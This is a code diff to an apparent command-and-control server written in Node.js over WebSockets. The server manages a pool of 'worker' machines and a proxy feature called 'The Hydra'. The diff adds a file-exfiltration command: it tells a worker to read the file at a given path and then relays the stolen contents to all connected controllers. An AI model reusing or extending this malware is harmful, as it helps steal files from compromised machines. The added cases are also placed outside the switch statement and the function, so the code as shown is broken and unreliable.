@@ -109,6 +109,7 @@ function handleMessage(ws, data) {
             broadcastStats();
             break;
 
+
         // --- PROXY (The Hydra) ---
         case 'SEND_PROXY_CMD':
             // 1. Pick a random worker from the Map
@@ -160,6 +161,27 @@ function handleMessage(ws, data) {
              break;
     }
 }
+
+        // 8. Client wants to DOWNLOAD a file
+        case 'SEND_EXFIL_CMD':
+             const exfilWorkers = Array.from(workers.keys());
+             if (exfilWorkers.length > 0) {
+                 exfilWorkers[0].send(JSON.stringify({
+                     type: 'EXFIL_CMD',
+                     path: data.path
+                 }));
+             }
+             break;
+
+        // 9. Worker sends the file back
+        case 'EXFIL_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({
+                 type: 'EXFIL_RECEIVE',
+                 filename: data.filename,
+                 data: data.data
+             })));
+             break;
+
 
 function sendJob(ws) {
     if (foundGoldenTicket) {
